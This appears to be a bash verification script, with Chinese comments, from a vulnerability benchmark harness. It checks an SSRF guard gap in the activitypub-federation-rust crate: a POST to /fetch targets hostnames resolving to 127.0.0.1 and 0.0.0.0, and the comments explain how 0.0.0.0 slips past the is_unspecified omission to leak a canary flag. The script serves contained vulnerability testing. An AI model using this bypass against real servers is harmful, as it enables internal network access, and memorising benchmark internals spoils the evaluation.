#!/usr/bin/env bash
# verify.sh --seed|--residual — activitypub-federation-rust
# （CVE-2025-25194 seed / CVE-2026-33693 residual，SSRF 守卫缺口，ssrf-sidecar）。
#
# 机制：外部 POST /fetch {"url": ...} -> 服务调用真实 crate fetch_object_http ->
# crate 自身 verify_url_valid 守卫（解析目标 IP 后决定放行/拒绝）：
#   seed     http://original-target.pcb/flag（/etc/hosts -> 127.0.0.1）：
#            V0(0.6.1) 无 IP 解析守卫 -> 直连 loopback sidecar -> flag 返回；
#            V1(0.7.0-beta.8) is_loopback 拒绝 -> UrlVerificationError -> blocked。
#   residual http://residual-target.pcb/flag（/etc/hosts -> 0.0.0.0）：
#            V1 守卫检查 is_private||is_link_local||is_loopback||is_multicast，
#            遗漏 is_unspecified -> 0.0.0.0 放行，OS 路由 0.0.0.0 -> localhost ->
#            sidecar -> flag 返回（CVE-2026-33693）；
#            V2(0.7.0-beta.9) v4_is_invalid 增加 is_unspecified -> blocked。
# 效果通道 = 服务 JSON 响应的 flag_body 字段（sidecar 返回的 ActivityPub object content）。
# flag 通道 = canary 类（sidecar 进程在容器内持有 ${PCB_FLAG}；服务进程以 env -u PCB_FLAG
#             启动，flag 只能经真实 crate fetch 的 loopback SSRF 流出）。
# 判定基准 = RUN_FLAG（提交值；canary 类）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 动态解析宿主端口（compose 服务名 = $VERSION，容器端口 8080；不依赖硬编码端口）
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed -n 's/^.*://p' | tr -d '[:space:]' | head -1)"
[[ -n "$PORT" ]] || { echo "cannot resolve host port for $VERSION" >&2; exit 20; }

# 攻击目标：与 poc/original_poc.py（seed）和 _heldout/bypass_poc.py（residual）一致
if [[ "$MODE" == "--seed" ]]; then
  TARGET_URL="http://original-target.pcb/flag"   # -> 127.0.0.1（V1 is_loopback 拒绝）
else
  TARGET_URL="http://residual-target.pcb/flag"   # -> 0.0.0.0（V1 遗漏 is_unspecified）
fi

BODY="$(PCB_PORT="$PORT" PCB_URL="$TARGET_URL" "$PY" - <<'PYEOF' 2>&1
import json, os, sys, time, urllib.error, urllib.request
url = "http://127.0.0.1:%s/fetch" % os.environ["PCB_PORT"]
data = json.dumps({"url": os.environ["PCB_URL"]}).encode()
last = ""
for _ in range(15):
    try:
        req = urllib.request.Request(url, data=data,
                                     headers={"Content-Type": "application/json"},
                                     method="POST")
        with urllib.request.urlopen(req, timeout=25) as r:
            body = r.read().decode("utf-8", "replace")
        print(body[:4000])
        sys.exit(0)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        print(body[:4000])
        sys.exit(0)
    except Exception as e:
        last = "<request-error: %s: %s>" % (type(e).__name__, e)
        time.sleep(5)
print(last)
sys.exit(1)
PYEOF
)"
RC=$?
if [[ $RC -ne 0 ]]; then echo "$BODY" >&2; exit 20; fi
echo "$BODY" | head -c 600; echo
if grep -qF "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
